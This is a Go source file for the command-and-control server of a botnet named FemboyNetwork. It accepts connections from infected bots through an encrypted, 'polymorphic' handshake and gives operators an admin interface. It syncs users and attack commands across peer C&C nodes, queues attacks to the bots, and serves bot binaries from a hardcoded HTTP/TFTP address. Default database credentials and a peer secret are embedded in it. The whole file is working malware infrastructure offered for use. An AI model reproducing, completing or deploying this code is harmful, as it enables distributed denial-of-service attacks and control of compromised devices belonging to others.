package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"
	"time"
)

var clientList *ClientList = NewClientList()
var database *Database
var debugMode = os.Getenv("DEBUG") != ""
var cncStartTime = time.Now()
var peerMgr *PeerManager

func main() {
	cfgPath := "config.json"
	if _, err := os.Stat(cfgPath); os.IsNotExist(err) {
		cfgPath = filepath.Join(filepath.Dir(os.Args[0]), "config.json")
	}
	c, err := loadConfig(cfgPath)
	if err != nil {
		fmt.Println("config load failed, using defaults:", err)
		c = &Config{
			CncListen:   "0.0.0.0:34129",
			AdminListen: "0.0.0.0:34131",
			ScanListen:  "0.0.0.0:34130",
			MysqlAddr:   "127.0.0.1:3306",
			MysqlUser:   "fnbnet",
			MysqlPass:   "fnbnet",
			MysqlTable:  "FemboyNetwork",
			HttpServer:  "195.209.219.35",
			TftpServer:  "195.209.219.35",
			BinPrefix:   "fnbnet",
			BinPath:     "/var/www/html/bins",
			CncID:       1,
			PeerSecret:  "botnetvmc0redev012",
			PeerListen:  "0.0.0.0:34133",
		}
		cfg = c
	}
	database = NewDatabase(c.MysqlAddr, c.MysqlUser, c.MysqlPass, c.MysqlTable)
	protoInit(cfg.ProtoKey)

	// init log file with rotation
	logDir := "/var/log/fmbnet"
	os.MkdirAll(logDir, 0755)
	logPath := filepath.Join(logDir, "cnc.log")
	// rotate if > 10MB
	if fi, _ := os.Stat(logPath); fi != nil && fi.Size() > 10*1024*1024 {
		os.Rename(logPath, logPath+".1")
	}
	logFile, err := os.OpenFile(logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err == nil {
		log.SetOutput(logFile)
		log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
		defer logFile.Close()
		log.Printf("[main] log started: %s", logPath)
	}

	// start peer manager
	if len(c.CncPeers) > 0 {
		peerMgr = NewPeerManager(c.CncID, c.PeerSecret, c.PeerListen, c.CncPeers)
		peerMgr.OnBotJoin(func(join *PeerBotJoin) {
			// register remote bot
			bot := &Bot{
				uid:      join.UID,
				versionStr: join.Version,
				source:   join.Source,
				modules:  join.Modules,
				capFlags: join.CapFlags,
				remoteID: join.RemoteID,
			}
			clientList.AddRemote(bot)
		})
		peerMgr.OnBotLeave(func(uid, peerID int) {
			clientList.DelRemote(uid, peerID)
		})
		peerMgr.OnAttack(func(atk *PeerAttack) {
			clientList.QueueBuf(atk.AttackData, atk.MaxBots, atk.BotCata)
		})
		peerMgr.OnUserAdd(func(ua *PeerUserAdd) {
			if ua.Admin != 0 {
				database.CreateAdmin(ua.Username, ua.Password, ua.MaxBots, ua.Duration, ua.Cooldown)
			} else {
				database.CreateUser(ua.Username, ua.Password, ua.MaxBots, ua.Duration, ua.Cooldown)
			}
		})
		peerMgr.OnUserDel(func(username string) {
			database.RemoveUser(username)
		})
		peerMgr.Start()
	}

	go listenAdmin(c.AdminListen)
	if _, err := StartBinServer(); err != nil {
		fmt.Println("bin server:", err)
	}
	if err := startDnsServer(); err != nil {
		fmt.Println("dns server:", err)
	}

	startScheduler()
	go botCountAlert()

	// graceful shutdown
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGTERM, syscall.SIGINT)
	go func() {
		sig := <-sigCh
		log.Printf("[main] received %v, shutting down", sig)
		clientList.QueueBuf(BuildAttackStop(), -1, "")
		trackAttackStop()
		time.Sleep(3 * time.Second)
		os.Exit(0)
	}()
	tel, err := net.Listen("tcp", c.CncListen)
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println("[ FemboyNetwork CNC ready ]")
	fmt.Println("  bots:  ", c.CncListen)
	fmt.Println("  admin: ", c.AdminListen)
	fmt.Println("  node:  ", c.CncID)
	if peerMgr != nil {
		fmt.Println("  peers: ", len(c.CncPeers))
	}

	for {
		conn, err := tel.Accept()
		if err != nil {
			break
		}
		go botHandler(conn)
	}

	fmt.Println("ERROR: run ulimit -n 999999")
}

func listenAdmin(addr string) {
	tel, err := net.Listen("tcp", addr)
	if err != nil {
		log.Printf("[admin] listen %s: %v", addr, err)
		return
	}
	for {
		conn, err := tel.Accept()
		if err != nil {
			break
		}
		go func(c net.Conn) {
			if debugMode {
				log.Printf("[cnc] admin connect %s", c.RemoteAddr())
			}
			NewAdmin(c).Handle()
		}(conn)
	}
}

func botHandler(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	const minHandshake = 4 + 1
	buf := make([]byte, 256)
	n, err := conn.Read(buf)
	if err != nil || n < minHandshake {
		if debugMode {
			log.Printf("[cnc] bot handshake read err from %s: %v", conn.RemoteAddr(), err)
		}
		return
	}

	if protoReady() {
		protoDecrypt(buf[:n])
	}

	if n < 4 {
		return
	}
	magic := binary.BigEndian.Uint16(buf[0:2])
	if magic != uint16(ProtoMagicBot) {
		if debugMode {
			log.Printf("[cnc] invalid magic 0x%04x from %s, drop", magic, conn.RemoteAddr())
		}
		return
	}

	ver := buf[2]
	idLen := buf[3]
	var source string
	if idLen > 0 && n >= 4+int(idLen) {
		source = string(buf[4 : 4+idLen])
	} else if idLen > 0 {
		rest := make([]byte, idLen)
		if readXBytes(conn, rest) != nil {
			return
		}
		if protoReady() {
			protoDecrypt(rest)
		}
		source = string(rest)
	}

	if debugMode {
		log.Printf("[cnc] bot connected %s ver=%d source=%s", conn.RemoteAddr(), ver, source)
	}

	// polymorphic handshake
	ctx := &HandshakeCtx{}
	if err := polymorphicHandshakeRespond(conn, ctx); err != nil {
		if debugMode {
			log.Printf("[cnc] polymorphic handshake failed from %s: %v", conn.RemoteAddr(), err)
		}
		return
	}

	NewBot(conn, ver, source, ctx).Handle()
}

func readXBytes(conn net.Conn, buf []byte) error {
	tl := 0

	for tl < len(buf) {
		n, err := conn.Read(buf[tl:])
		if err != nil {
			return err
		}
		if n <= 0 {
			return errors.New("Connection closed unexpectedly")
		}
		tl += n
	}

	return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
	return uint32(prefix >> (32 - netmask))
}

func botCountAlert() {
	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()
	var prevCount int
	for range ticker.C {
		count := clientList.BotCount()
		if prevCount > 0 && count < prevCount/2 && count < 10 {
			log.Printf("[alert] bot count dropped: %d → %d", prevCount, count)
		}
		prevCount = count
	}
}
